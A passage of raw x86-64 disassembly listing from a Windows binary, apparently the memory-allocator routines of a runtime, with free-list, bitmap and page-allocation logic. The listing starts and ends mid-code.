    6d8c1c65:	49 89 d1             	mov    %rdx,%r9
    6d8c1c68:	ba 10 00 00 00       	mov    $0x10,%edx
    6d8c1c6d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    6d8c1c72:	e8 d7 ff ff ff       	call   0x6d8c1c4e
    6d8c1c77:	44 89 c9             	mov    %r9d,%ecx
    6d8c1c7a:	e8 11 ff ff ff       	call   0x6d8c1b90
    6d8c1c7f:	8d 48 fb             	lea    -0x5(%rax),%ecx
    6d8c1c82:	48 83 e8 06          	sub    $0x6,%rax
    6d8c1c86:	49 d3 f9             	sar    %cl,%r9
    6d8c1c89:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    6d8c1c8e:	4c 89 d0             	mov    %r10,%rax
    6d8c1c91:	49 83 e9 20          	sub    $0x20,%r9
    6d8c1c95:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
    6d8c1c9a:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
    6d8c1c9f:	41 0f 11 02          	movups %xmm0,(%r10)
    6d8c1ca3:	48 83 c4 38          	add    $0x38,%rsp
    6d8c1ca7:	c3                   	ret
    6d8c1ca8:	57                   	push   %rdi
    6d8c1ca9:	56                   	push   %rsi
    6d8c1caa:	48 8b 3a             	mov    (%rdx),%rdi
    6d8c1cad:	48 8d 72 10          	lea    0x10(%rdx),%rsi
    6d8c1cb1:	48 89 c8             	mov    %rcx,%rax
    6d8c1cb4:	48 8b 09             	mov    (%rcx),%rcx
    6d8c1cb7:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
    6d8c1cbc:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
    6d8c1cc0:	4c 89 c7             	mov    %r8,%rdi
    6d8c1cc3:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c1cc5:	48 8b 12             	mov    (%rdx),%rdx
    6d8c1cc8:	48 01 10             	add    %rdx,(%rax)
    6d8c1ccb:	5e                   	pop    %rsi
    6d8c1ccc:	5f                   	pop    %rdi
    6d8c1ccd:	c3                   	ret
    6d8c1cce:	c3                   	ret
    6d8c1ccf:	48 8b 05 ea 2a 10 00 	mov    0x102aea(%rip),%rax        # 0x6d9c47c0
    6d8c1cd6:	48 85 c0             	test   %rax,%rax
    6d8c1cd9:	74 0c                	je     0x6d8c1ce7
    6d8c1cdb:	48 39 c8             	cmp    %rcx,%rax
    6d8c1cde:	74 0e                	je     0x6d8c1cee
    6d8c1ce0:	48 39 c1             	cmp    %rax,%rcx
    6d8c1ce3:	48 0f 4c c8          	cmovl  %rax,%rcx
    6d8c1ce7:	48 89 0d d2 2a 10 00 	mov    %rcx,0x102ad2(%rip)        # 0x6d9c47c0
    6d8c1cee:	c3                   	ret
    6d8c1cef:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c1cf3:	48 8b 05 2e 57 10 00 	mov    0x10572e(%rip),%rax        # 0x6d9c7428
    6d8c1cfa:	48 85 c0             	test   %rax,%rax
    6d8c1cfd:	74 02                	je     0x6d8c1d01
    6d8c1cff:	ff d0                	call   *%rax
    6d8c1d01:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c1d06:	ff 15 24 f3 00 00    	call   *0xf324(%rip)        # 0x6d8d1030
    6d8c1d0c:	48 8d 15 4e 04 01 00 	lea    0x1044e(%rip),%rdx        # 0x6d8d2161
    6d8c1d13:	48 89 c1             	mov    %rax,%rcx
    6d8c1d16:	e8 ec fe ff ff       	call   0x6d8c1c07
    6d8c1d1b:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c1d20:	e8 63 c8 00 00       	call   0x6d8ce588
    6d8c1d25:	90                   	nop
    6d8c1d26:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c1d2a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    6d8c1d30:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    6d8c1d36:	48 89 ca             	mov    %rcx,%rdx
    6d8c1d39:	31 c9                	xor    %ecx,%ecx
    6d8c1d3b:	ff 15 5b f5 10 00    	call   *0x10f55b(%rip)        # 0x6d9d129c
    6d8c1d41:	48 85 c0             	test   %rax,%rax
    6d8c1d44:	75 05                	jne    0x6d8c1d4b
    6d8c1d46:	e8 a4 ff ff ff       	call   0x6d8c1cef
    6d8c1d4b:	48 83 c4 28          	add    $0x28,%rsp
    6d8c1d4f:	c3                   	ret
    6d8c1d50:	56                   	push   %rsi
    6d8c1d51:	53                   	push   %rbx
    6d8c1d52:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c1d56:	48 8b b1 78 20 00 00 	mov    0x2078(%rcx),%rsi
    6d8c1d5d:	48 85 f6             	test   %rsi,%rsi
    6d8c1d60:	48 89 cb             	mov    %rcx,%rbx
    6d8c1d63:	74 05                	je     0x6d8c1d6a
    6d8c1d65:	48 39 16             	cmp    %rdx,(%rsi)
    6d8c1d68:	7d 39                	jge    0x6d8c1da3
    6d8c1d6a:	b9 00 10 00 00       	mov    $0x1000,%ecx
    6d8c1d6f:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
    6d8c1d74:	e8 ad ff ff ff       	call   0x6d8c1d26
    6d8c1d79:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
    6d8c1d7e:	48 89 83 78 20 00 00 	mov    %rax,0x2078(%rbx)
    6d8c1d85:	48 81 83 80 20 00 00 	addq   $0x1000,0x2080(%rbx)
    6d8c1d8c:	00 10 00 00 
    6d8c1d90:	48 89 70 10          	mov    %rsi,0x10(%rax)
    6d8c1d94:	48 c7 00 e8 0f 00 00 	movq   $0xfe8,(%rax)
    6d8c1d9b:	48 c7 40 08 18 00 00 	movq   $0x18,0x8(%rax)
    6d8c1da2:	00 
    6d8c1da3:	48 8b 8b 78 20 00 00 	mov    0x2078(%rbx),%rcx
    6d8c1daa:	4c 8b 41 08          	mov    0x8(%rcx),%r8
    6d8c1dae:	48 29 11             	sub    %rdx,(%rcx)
    6d8c1db1:	4e 8d 0c 01          	lea    (%rcx,%r8,1),%r9
    6d8c1db5:	49 01 d0             	add    %rdx,%r8
    6d8c1db8:	4c 89 41 08          	mov    %r8,0x8(%rcx)
    6d8c1dbc:	4c 89 c9             	mov    %r9,%rcx
    6d8c1dbf:	e8 8a fe ff ff       	call   0x6d8c1c4e
    6d8c1dc4:	4c 89 c8             	mov    %r9,%rax
    6d8c1dc7:	48 83 c4 28          	add    $0x28,%rsp
    6d8c1dcb:	5b                   	pop    %rbx
    6d8c1dcc:	5e                   	pop    %rsi
    6d8c1dcd:	c3                   	ret
    6d8c1dce:	56                   	push   %rsi
    6d8c1dcf:	53                   	push   %rbx
    6d8c1dd0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c1dd4:	48 8d 81 00 29 00 00 	lea    0x2900(%rcx),%rax
    6d8c1ddb:	48 89 cb             	mov    %rcx,%rbx
    6d8c1dde:	48 89 d6             	mov    %rdx,%rsi
    6d8c1de1:	48 85 c0             	test   %rax,%rax
    6d8c1de4:	74 2c                	je     0x6d8c1e12
    6d8c1de6:	48 8b 10             	mov    (%rax),%rdx
    6d8c1de9:	48 83 fa 1d          	cmp    $0x1d,%rdx
    6d8c1ded:	7e 09                	jle    0x6d8c1df8
    6d8c1def:	48 8b 80 e8 01 00 00 	mov    0x1e8(%rax),%rax
    6d8c1df6:	eb e9                	jmp    0x6d8c1de1
    6d8c1df8:	48 89 d1             	mov    %rdx,%rcx
    6d8c1dfb:	48 ff c2             	inc    %rdx
    6d8c1dfe:	48 c1 e1 04          	shl    $0x4,%rcx
    6d8c1e02:	48 01 c1             	add    %rax,%rcx
    6d8c1e05:	48 89 71 08          	mov    %rsi,0x8(%rcx)
    6d8c1e09:	4c 89 41 10          	mov    %r8,0x10(%rcx)
    6d8c1e0d:	48 89 10             	mov    %rdx,(%rax)
    6d8c1e10:	eb 3b                	jmp    0x6d8c1e4d
    6d8c1e12:	ba f0 01 00 00       	mov    $0x1f0,%edx
    6d8c1e17:	48 89 d9             	mov    %rbx,%rcx
    6d8c1e1a:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
    6d8c1e1f:	e8 2c ff ff ff       	call   0x6d8c1d50
    6d8c1e24:	48 8b 93 e8 2a 00 00 	mov    0x2ae8(%rbx),%rdx
    6d8c1e2b:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
    6d8c1e30:	48 89 90 e8 01 00 00 	mov    %rdx,0x1e8(%rax)
    6d8c1e37:	48 89 83 e8 2a 00 00 	mov    %rax,0x2ae8(%rbx)
    6d8c1e3e:	48 89 70 08          	mov    %rsi,0x8(%rax)
    6d8c1e42:	4c 89 40 10          	mov    %r8,0x10(%rax)
    6d8c1e46:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
    6d8c1e4d:	48 83 c4 28          	add    $0x28,%rsp
    6d8c1e51:	5b                   	pop    %rbx
    6d8c1e52:	5e                   	pop    %rsi
    6d8c1e53:	c3                   	ret
    6d8c1e54:	0f b6 c2             	movzbl %dl,%eax
    6d8c1e57:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
    6d8c1e5b:	48 85 c0             	test   %rax,%rax
    6d8c1e5e:	74 0b                	je     0x6d8c1e6b
    6d8c1e60:	48 39 50 08          	cmp    %rdx,0x8(%rax)
    6d8c1e64:	74 05                	je     0x6d8c1e6b
    6d8c1e66:	48 8b 00             	mov    (%rax),%rax
    6d8c1e69:	eb f0                	jmp    0x6d8c1e5b
    6d8c1e6b:	c3                   	ret
    6d8c1e6c:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c1e70:	49 89 d0             	mov    %rdx,%r8
    6d8c1e73:	48 c1 fa 09          	sar    $0x9,%rdx
    6d8c1e77:	e8 d8 ff ff ff       	call   0x6d8c1e54
    6d8c1e7c:	31 d2                	xor    %edx,%edx
    6d8c1e7e:	48 85 c0             	test   %rax,%rax
    6d8c1e81:	74 1b                	je     0x6d8c1e9e
    6d8c1e83:	4c 89 c1             	mov    %r8,%rcx
    6d8c1e86:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
    6d8c1e8c:	48 89 ca             	mov    %rcx,%rdx
    6d8c1e8f:	48 c1 fa 06          	sar    $0x6,%rdx
    6d8c1e93:	48 8b 54 d0 10       	mov    0x10(%rax,%rdx,8),%rdx
    6d8c1e98:	48 d3 ea             	shr    %cl,%rdx
    6d8c1e9b:	83 e2 01             	and    $0x1,%edx
    6d8c1e9e:	89 d0                	mov    %edx,%eax
    6d8c1ea0:	48 83 c4 28          	add    $0x28,%rsp
    6d8c1ea4:	c3                   	ret
    6d8c1ea5:	57                   	push   %rdi
    6d8c1ea6:	56                   	push   %rsi
    6d8c1ea7:	53                   	push   %rbx
    6d8c1ea8:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c1eac:	80 b9 c9 28 00 00 00 	cmpb   $0x0,0x28c9(%rcx)
    6d8c1eb3:	48 89 cb             	mov    %rcx,%rbx
    6d8c1eb6:	48 89 d7             	mov    %rdx,%rdi
    6d8c1eb9:	75 56                	jne    0x6d8c1f11
    6d8c1ebb:	48 8b 91 98 20 00 00 	mov    0x2098(%rcx),%rdx
    6d8c1ec2:	48 81 fa ff ff 00 00 	cmp    $0xffff,%rdx
    6d8c1ec9:	7e 3b                	jle    0x6d8c1f06
    6d8c1ecb:	48 8b 81 d0 28 00 00 	mov    0x28d0(%rcx),%rax
    6d8c1ed2:	b9 00 00 00 3f       	mov    $0x3f000000,%ecx
    6d8c1ed7:	48 01 c0             	add    %rax,%rax
    6d8c1eda:	48 3d 00 00 00 3f    	cmp    $0x3f000000,%rax
    6d8c1ee0:	48 0f 4f c1          	cmovg  %rcx,%rax
    6d8c1ee4:	48 c1 fa 02          	sar    $0x2,%rdx
    6d8c1ee8:	48 81 c2 ff 0f 00 00 	add    $0xfff,%rdx
    6d8c1eef:	48 81 e2 00 f0 ff ff 	and    $0xfffffffffffff000,%rdx
    6d8c1ef6:	48 39 d0             	cmp    %rdx,%rax
    6d8c1ef9:	48 0f 4f c2          	cmovg  %rdx,%rax
    6d8c1efd:	48 89 83 d0 28 00 00 	mov    %rax,0x28d0(%rbx)
    6d8c1f04:	eb 0b                	jmp    0x6d8c1f11
    6d8c1f06:	48 c7 81 d0 28 00 00 	movq   $0x4000,0x28d0(%rcx)
    6d8c1f0d:	00 40 00 00 
    6d8c1f11:	48 8b 93 d0 28 00 00 	mov    0x28d0(%rbx),%rdx
    6d8c1f18:	48 39 fa             	cmp    %rdi,%rdx
    6d8c1f1b:	7c 25                	jl     0x6d8c1f42
    6d8c1f1d:	31 c9                	xor    %ecx,%ecx
    6d8c1f1f:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    6d8c1f25:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    6d8c1f2b:	ff 15 6b f3 10 00    	call   *0x10f36b(%rip)        # 0x6d9d129c
    6d8c1f31:	48 85 c0             	test   %rax,%rax
    6d8c1f34:	48 89 c6             	mov    %rax,%rsi
    6d8c1f37:	74 16                	je     0x6d8c1f4f
    6d8c1f39:	48 8b bb d0 28 00 00 	mov    0x28d0(%rbx),%rdi
    6d8c1f40:	eb 1f                	jmp    0x6d8c1f61
    6d8c1f42:	48 89 f9             	mov    %rdi,%rcx
    6d8c1f45:	e8 dc fd ff ff       	call   0x6d8c1d26
    6d8c1f4a:	48 89 c6             	mov    %rax,%rsi
    6d8c1f4d:	eb 12                	jmp    0x6d8c1f61
    6d8c1f4f:	48 89 f9             	mov    %rdi,%rcx
    6d8c1f52:	e8 cf fd ff ff       	call   0x6d8c1d26
    6d8c1f57:	c6 83 c9 28 00 00 01 	movb   $0x1,0x28c9(%rbx)
    6d8c1f5e:	48 89 c6             	mov    %rax,%rsi
    6d8c1f61:	48 01 bb 80 20 00 00 	add    %rdi,0x2080(%rbx)
    6d8c1f68:	49 89 f8             	mov    %rdi,%r8
    6d8c1f6b:	48 89 f2             	mov    %rsi,%rdx
    6d8c1f6e:	48 89 d9             	mov    %rbx,%rcx
    6d8c1f71:	48 01 bb 90 20 00 00 	add    %rdi,0x2090(%rbx)
    6d8c1f78:	e8 51 fe ff ff       	call   0x6d8c1dce
    6d8c1f7d:	4c 8d 0c 37          	lea    (%rdi,%rsi,1),%r9
    6d8c1f81:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
    6d8c1f88:	00 
    6d8c1f89:	4c 8d 9b a8 20 00 00 	lea    0x20a8(%rbx),%r11
    6d8c1f90:	4c 89 ca             	mov    %r9,%rdx
    6d8c1f93:	48 c7 46 18 00 00 00 	movq   $0x0,0x18(%rsi)
    6d8c1f9a:	00 
    6d8c1f9b:	48 c1 fa 0c          	sar    $0xc,%rdx
    6d8c1f9f:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
    6d8c1fa3:	4c 89 d9             	mov    %r11,%rcx
    6d8c1fa6:	e8 c1 fe ff ff       	call   0x6d8c1e6c
    6d8c1fab:	84 c0                	test   %al,%al
    6d8c1fad:	74 0c                	je     0x6d8c1fbb
    6d8c1faf:	49 8b 01             	mov    (%r9),%rax
    6d8c1fb2:	83 e0 01             	and    $0x1,%eax
    6d8c1fb5:	48 09 f8             	or     %rdi,%rax
    6d8c1fb8:	49 89 01             	mov    %rax,(%r9)
    6d8c1fbb:	4c 8b 8b a0 20 00 00 	mov    0x20a0(%rbx),%r9
    6d8c1fc2:	4d 85 c9             	test   %r9,%r9
    6d8c1fc5:	75 06                	jne    0x6d8c1fcd
    6d8c1fc7:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
    6d8c1fcd:	49 89 f2             	mov    %rsi,%r10
    6d8c1fd0:	4c 89 d9             	mov    %r11,%rcx
    6d8c1fd3:	4d 29 ca             	sub    %r9,%r10
    6d8c1fd6:	4c 89 d2             	mov    %r10,%rdx
    6d8c1fd9:	48 c1 fa 0c          	sar    $0xc,%rdx
    6d8c1fdd:	e8 8a fe ff ff       	call   0x6d8c1e6c
    6d8c1fe2:	48 8b 16             	mov    (%rsi),%rdx
    6d8c1fe5:	83 e2 01             	and    $0x1,%edx
    6d8c1fe8:	84 c0                	test   %al,%al
    6d8c1fea:	74 09                	je     0x6d8c1ff5
    6d8c1fec:	4d 39 4a 08          	cmp    %r9,0x8(%r10)
    6d8c1ff0:	75 03                	jne    0x6d8c1ff5
    6d8c1ff2:	4c 09 ca             	or     %r9,%rdx
    6d8c1ff5:	48 89 f0             	mov    %rsi,%rax
    6d8c1ff8:	48 89 16             	mov    %rdx,(%rsi)
    6d8c1ffb:	48 89 bb a0 20 00 00 	mov    %rdi,0x20a0(%rbx)
    6d8c2002:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2006:	5b                   	pop    %rbx
    6d8c2007:	5e                   	pop    %rsi
    6d8c2008:	5f                   	pop    %rdi
    6d8c2009:	c3                   	ret
    6d8c200a:	56                   	push   %rsi
    6d8c200b:	53                   	push   %rbx
    6d8c200c:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c2010:	48 89 d6             	mov    %rdx,%rsi
    6d8c2013:	49 89 c9             	mov    %rcx,%r9
    6d8c2016:	4c 89 c2             	mov    %r8,%rdx
    6d8c2019:	48 89 f1             	mov    %rsi,%rcx
    6d8c201c:	4c 89 c3             	mov    %r8,%rbx
    6d8c201f:	e8 30 fe ff ff       	call   0x6d8c1e54
    6d8c2024:	48 85 c0             	test   %rax,%rax
    6d8c2027:	75 21                	jne    0x6d8c204a
    6d8c2029:	ba 50 00 00 00       	mov    $0x50,%edx
    6d8c202e:	4c 89 c9             	mov    %r9,%rcx
    6d8c2031:	e8 1a fd ff ff       	call   0x6d8c1d50
    6d8c2036:	0f b6 d3             	movzbl %bl,%edx
    6d8c2039:	48 8d 14 d6          	lea    (%rsi,%rdx,8),%rdx
    6d8c203d:	48 8b 0a             	mov    (%rdx),%rcx
    6d8c2040:	48 89 08             	mov    %rcx,(%rax)
    6d8c2043:	48 89 02             	mov    %rax,(%rdx)
    6d8c2046:	48 89 58 08          	mov    %rbx,0x8(%rax)
    6d8c204a:	48 83 c4 28          	add    $0x28,%rsp
    6d8c204e:	5b                   	pop    %rbx
    6d8c204f:	5e                   	pop    %rsi
    6d8c2050:	c3                   	ret
    6d8c2051:	53                   	push   %rbx
    6d8c2052:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c2056:	4c 89 c3             	mov    %r8,%rbx
    6d8c2059:	49 c1 f8 09          	sar    $0x9,%r8
    6d8c205d:	e8 a8 ff ff ff       	call   0x6d8c200a
    6d8c2062:	81 e3 ff 01 00 00    	and    $0x1ff,%ebx
    6d8c2068:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c206d:	49 89 d8             	mov    %rbx,%r8
    6d8c2070:	48 89 d9             	mov    %rbx,%rcx
    6d8c2073:	49 c1 f8 06          	sar    $0x6,%r8
    6d8c2077:	48 d3 e2             	shl    %cl,%rdx
    6d8c207a:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
    6d8c207f:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2083:	5b                   	pop    %rbx
    6d8c2084:	c3                   	ret
    6d8c2085:	57                   	push   %rdi
    6d8c2086:	56                   	push   %rsi
    6d8c2087:	53                   	push   %rbx
    6d8c2088:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c208c:	4c 8b 52 08          	mov    0x8(%rdx),%r10
    6d8c2090:	49 8d 1c 10          	lea    (%r8,%rdx,1),%rbx
    6d8c2094:	4d 29 c2             	sub    %r8,%r10
    6d8c2097:	49 89 d1             	mov    %rdx,%r9
    6d8c209a:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
    6d8c209f:	4c 89 53 08          	mov    %r10,0x8(%rbx)
    6d8c20a3:	4c 8b 5a 08          	mov    0x8(%rdx),%r11
    6d8c20a7:	48 8d b9 a8 20 00 00 	lea    0x20a8(%rcx),%rdi
    6d8c20ae:	48 89 ce             	mov    %rcx,%rsi
    6d8c20b1:	4c 89 03             	mov    %r8,(%rbx)
    6d8c20b4:	48 89 f9             	mov    %rdi,%rcx
    6d8c20b7:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
    6d8c20be:	00 
    6d8c20bf:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
    6d8c20c6:	00 
    6d8c20c7:	49 01 d3             	add    %rdx,%r11
    6d8c20ca:	4c 89 da             	mov    %r11,%rdx
    6d8c20cd:	48 c1 fa 0c          	sar    $0xc,%rdx
    6d8c20d1:	e8 96 fd ff ff       	call   0x6d8c1e6c
    6d8c20d6:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
    6d8c20db:	84 c0                	test   %al,%al
    6d8c20dd:	74 0c                	je     0x6d8c20eb
    6d8c20df:	49 8b 03             	mov    (%r11),%rax
    6d8c20e2:	83 e0 01             	and    $0x1,%eax
    6d8c20e5:	4c 09 d0             	or     %r10,%rax
    6d8c20e8:	49 89 03             	mov    %rax,(%r11)
    6d8c20eb:	4d 89 41 08          	mov    %r8,0x8(%r9)
    6d8c20ef:	49 89 d8             	mov    %rbx,%r8
    6d8c20f2:	48 89 fa             	mov    %rdi,%rdx
    6d8c20f5:	48 89 f1             	mov    %rsi,%rcx
    6d8c20f8:	49 c1 f8 0c          	sar    $0xc,%r8
    6d8c20fc:	e8 50 ff ff ff       	call   0x6d8c2051
    6d8c2101:	48 89 d8             	mov    %rbx,%rax
    6d8c2104:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2108:	5b                   	pop    %rbx
    6d8c2109:	5e                   	pop    %rsi
    6d8c210a:	5f                   	pop    %rdi
    6d8c210b:	c3                   	ret
    6d8c210c:	53                   	push   %rbx
    6d8c210d:	48 83 ec 30          	sub    $0x30,%rsp
    6d8c2111:	48 89 d3             	mov    %rdx,%rbx
    6d8c2114:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    6d8c2118:	49 89 cb             	mov    %rcx,%r11
    6d8c211b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    6d8c2120:	e8 39 fb ff ff       	call   0x6d8c1c5e
    6d8c2125:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
    6d8c212a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c212f:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
    6d8c2136:	00 
    6d8c2137:	48 89 c2             	mov    %rax,%rdx
    6d8c213a:	48 c1 e2 05          	shl    $0x5,%rdx
    6d8c213e:	48 01 ca             	add    %rcx,%rdx
    6d8c2141:	4d 8d 04 d3          	lea    (%r11,%rdx,8),%r8
    6d8c2145:	49 8b 90 78 08 00 00 	mov    0x878(%r8),%rdx
    6d8c214c:	48 85 d2             	test   %rdx,%rdx
    6d8c214f:	48 89 53 10          	mov    %rdx,0x10(%rbx)
    6d8c2153:	74 04                	je     0x6d8c2159
    6d8c2155:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
    6d8c2159:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c215e:	49 89 98 78 08 00 00 	mov    %rbx,0x878(%r8)
    6d8c2165:	83 e1 1f             	and    $0x1f,%ecx
    6d8c2168:	48 89 d3             	mov    %rdx,%rbx
    6d8c216b:	48 d3 e3             	shl    %cl,%rbx
    6d8c216e:	89 c1                	mov    %eax,%ecx
    6d8c2170:	41 09 9c 83 14 08 00 	or     %ebx,0x814(%r11,%rax,4)
    6d8c2177:	00 
    6d8c2178:	83 e1 1f             	and    $0x1f,%ecx
    6d8c217b:	48 d3 e2             	shl    %cl,%rdx
    6d8c217e:	41 09 93 10 08 00 00 	or     %edx,0x810(%r11)
    6d8c2185:	48 83 c4 30          	add    $0x30,%rsp
    6d8c2189:	5b                   	pop    %rbx
    6d8c218a:	c3                   	ret
    6d8c218b:	53                   	push   %rbx
    6d8c218c:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c2190:	48 89 cb             	mov    %rcx,%rbx
    6d8c2193:	e8 ed fe ff ff       	call   0x6d8c2085
    6d8c2198:	48 89 d9             	mov    %rbx,%rcx
    6d8c219b:	48 89 c2             	mov    %rax,%rdx
    6d8c219e:	48 83 c4 20          	add    $0x20,%rsp
    6d8c21a2:	5b                   	pop    %rbx
    6d8c21a3:	e9 64 ff ff ff       	jmp    0x6d8c210c
    6d8c21a8:	48 8b 42 10          	mov    0x10(%rdx),%rax
    6d8c21ac:	49 89 ca             	mov    %rcx,%r10
    6d8c21af:	4c 89 c1             	mov    %r8,%rcx
    6d8c21b2:	48 c1 e1 05          	shl    $0x5,%rcx
    6d8c21b6:	48 85 c0             	test   %rax,%rax
    6d8c21b9:	49 8d 8c 09 0e 01 00 	lea    0x10e(%r9,%rcx,1),%rcx
    6d8c21c0:	00 
    6d8c21c1:	49 89 44 ca 08       	mov    %rax,0x8(%r10,%rcx,8)
    6d8c21c6:	75 3c                	jne    0x6d8c2204
    6d8c21c8:	4f 8d 1c 82          	lea    (%r10,%r8,4),%r11
    6d8c21cc:	44 89 c9             	mov    %r9d,%ecx
    6d8c21cf:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c21d4:	83 e1 1f             	and    $0x1f,%ecx
    6d8c21d7:	49 89 c1             	mov    %rax,%r9
    6d8c21da:	49 d3 e1             	shl    %cl,%r9
    6d8c21dd:	41 f7 d1             	not    %r9d
    6d8c21e0:	45 23 8b 14 08 00 00 	and    0x814(%r11),%r9d
    6d8c21e7:	45 89 8b 14 08 00 00 	mov    %r9d,0x814(%r11)
    6d8c21ee:	75 1c                	jne    0x6d8c220c
    6d8c21f0:	44 89 c1             	mov    %r8d,%ecx
    6d8c21f3:	83 e1 1f             	and    $0x1f,%ecx
    6d8c21f6:	48 d3 e0             	shl    %cl,%rax
    6d8c21f9:	f7 d0                	not    %eax
    6d8c21fb:	41 21 82 10 08 00 00 	and    %eax,0x810(%r10)
    6d8c2202:	eb 08                	jmp    0x6d8c220c
    6d8c2204:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    6d8c220b:	00 
    6d8c220c:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
    6d8c2213:	00 
    6d8c2214:	48 c7 42 10 00 00 00 	movq   $0x0,0x10(%rdx)
    6d8c221b:	00 
    6d8c221c:	c3                   	ret
    6d8c221d:	57                   	push   %rdi
    6d8c221e:	56                   	push   %rsi
    6d8c221f:	53                   	push   %rbx
    6d8c2220:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c2224:	bf 00 00 00 3f       	mov    $0x3f000000,%edi
    6d8c2229:	48 89 cb             	mov    %rcx,%rbx
    6d8c222c:	89 d1                	mov    %edx,%ecx
    6d8c222e:	49 89 d0             	mov    %rdx,%r8
    6d8c2231:	e8 5a f9 ff ff       	call   0x6d8c1b90
    6d8c2236:	8d 48 fb             	lea    -0x5(%rax),%ecx
    6d8c2239:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c223e:	48 d3 e0             	shl    %cl,%rax
    6d8c2241:	48 05 ff 0f 00 00    	add    $0xfff,%rax
    6d8c2247:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
    6d8c224d:	4e 8d 54 00 ff       	lea    -0x1(%rax,%r8,1),%r10
    6d8c2252:	48 f7 d8             	neg    %rax
    6d8c2255:	49 21 c2             	and    %rax,%r10
    6d8c2258:	49 81 fa 00 00 00 3f 	cmp    $0x3f000000,%r10
    6d8c225f:	49 0f 4e fa          	cmovle %r10,%rdi
    6d8c2263:	89 f9                	mov    %edi,%ecx
    6d8c2265:	48 89 fe             	mov    %rdi,%rsi
    6d8c2268:	e8 23 f9 ff ff       	call   0x6d8c1b90
    6d8c226d:	ba ff ff ff ff       	mov    $0xffffffff,%edx
    6d8c2272:	8d 48 fb             	lea    -0x5(%rax),%ecx
    6d8c2275:	4c 8d 40 fa          	lea    -0x6(%rax),%r8
    6d8c2279:	48 d3 fe             	sar    %cl,%rsi
    6d8c227c:	48 89 f1             	mov    %rsi,%rcx
    6d8c227f:	48 89 d6             	mov    %rdx,%rsi
    6d8c2282:	48 83 e9 20          	sub    $0x20,%rcx
    6d8c2286:	48 d3 e6             	shl    %cl,%rsi
    6d8c2289:	48 89 f1             	mov    %rsi,%rcx
    6d8c228c:	23 8c 83 fc 07 00 00 	and    0x7fc(%rbx,%rax,4),%ecx
    6d8c2293:	75 2d                	jne    0x6d8c22c2
    6d8c2295:	41 8d 48 01          	lea    0x1(%r8),%ecx
    6d8c2299:	48 d3 e2             	shl    %cl,%rdx
    6d8c229c:	23 93 10 08 00 00    	and    0x810(%rbx),%edx
    6d8c22a2:	89 d1                	mov    %edx,%ecx
    6d8c22a4:	f7 d9                	neg    %ecx
    6d8c22a6:	21 d1                	and    %edx,%ecx
    6d8c22a8:	e8 e3 f8 ff ff       	call   0x6d8c1b90
    6d8c22ad:	48 85 c0             	test   %rax,%rax
    6d8c22b0:	49 89 c0             	mov    %rax,%r8
    6d8c22b3:	7e 4e                	jle    0x6d8c2303
    6d8c22b5:	8b 84 83 14 08 00 00 	mov    0x814(%rbx,%rax,4),%eax
    6d8c22bc:	89 c1                	mov    %eax,%ecx
    6d8c22be:	f7 d9                	neg    %ecx
    6d8c22c0:	eb 04                	jmp    0x6d8c22c6
    6d8c22c2:	89 c8                	mov    %ecx,%eax
    6d8c22c4:	f7 d8                	neg    %eax
    6d8c22c6:	21 c1                	and    %eax,%ecx
    6d8c22c8:	e8 c3 f8 ff ff       	call   0x6d8c1b90
    6d8c22cd:	4c 89 c2             	mov    %r8,%rdx
    6d8c22d0:	48 c1 e2 05          	shl    $0x5,%rdx
    6d8c22d4:	48 8d 94 10 0e 01 00 	lea    0x10e(%rax,%rdx,1),%rdx
    6d8c22db:	00 
    6d8c22dc:	48 8b 74 d3 08       	mov    0x8(%rbx,%rdx,8),%rsi
